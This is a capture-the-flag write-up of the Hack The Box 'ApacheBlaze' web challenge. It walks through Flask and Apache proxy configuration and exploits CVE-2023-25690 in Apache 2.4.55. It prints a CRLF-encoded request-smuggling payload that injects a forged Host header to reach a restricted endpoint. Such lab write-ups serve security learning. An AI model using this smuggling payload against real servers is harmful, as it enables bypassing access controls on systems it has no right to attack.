# [ApacheBlaze](https://app.hackthebox.com/challenges/ApacheBlaze) [HTB]
_Web_

## Investigating the website
This challenge's website hosts 4 different games, including:

> Click topia <br>
💎 Tap Tap equals to flag. 💎

Clicking on the play button returns a hint: 

> This game is currently available only from `dev.apacheblaze.local`.

As there is nothing else on the site (none of the other games actually works), I start looking at the code.

## Analyzing the code
This time I'm dealing with a Flask server. A simple search in the code reveals what is the condition to get the flag:
```py
if game == 'click_topia':
    print(f'{request.headers}', file=sys.stderr)
    if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
        return jsonify({
            'message': f'{app.config["FLAG"]}'
        }), 200
    else:
        return jsonify({
            'message': 'This game is currently available only from dev.apacheblaze.local.'
        }), 200
```
This looks straightforward, right? I add the required header to the HTTP search, run it and get the ~~flag~~ same exact response. 

What's going on? 

## Blaming Apache
Since simply setting the header doesn't work, and there is nothing suspicious in the rest of the Flask code, good old Apache Server must be the one sabotaging my exploit.

First, I take a look at the `httpd.conf` file, and discover that the server is using an internal proxy:
```
<VirtualHost *:1337>

    ServerName _

    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on

    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"

</VirtualHost>

<VirtualHost *:8080>

    ServerName _

    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/

    <Proxy balancer://mycluster>
        BalancerMember http://127.0.0.1:8081 route=127.0.0.1
        BalancerMember http://127.0.0.1:8082 route=127.0.0.1
        ProxySet stickysession=ROUTEID
        ProxySet lbmethod=byrequests
    </Proxy>

</VirtualHost>
```
From the [Apache documentation](https://httpd.apache.org/docs/trunk/mod/mod_proxy.html#x-headers) I discover that `ProxyPass` is actually responsible for setting `X-Forwarded-Host` to the `Host` of my original request. This means I must find a way to set `Host` to `dev.apacheblaze.local`.

## Smuggling the Host
From the Dockerfile, I discover the Apache version that is being used: 2.4.55. A search on Google returns that this version is vulnerable to HTTP Response Splitting (CVE-2023-25690). 

My aim is to smuggle this request:
```
GET /api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local
```
To do so, I follow [this PoC](https://github.com/dhmosfunk/CVE-2023-25690-POC) and perform header injection:
```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/api/games/click_topia HTTP/1.1
[...]
```
The injection is successful and I receive the flag!

## Read more!
[➡️ Next challenge: Encryption Bot](./encryptionbot.md)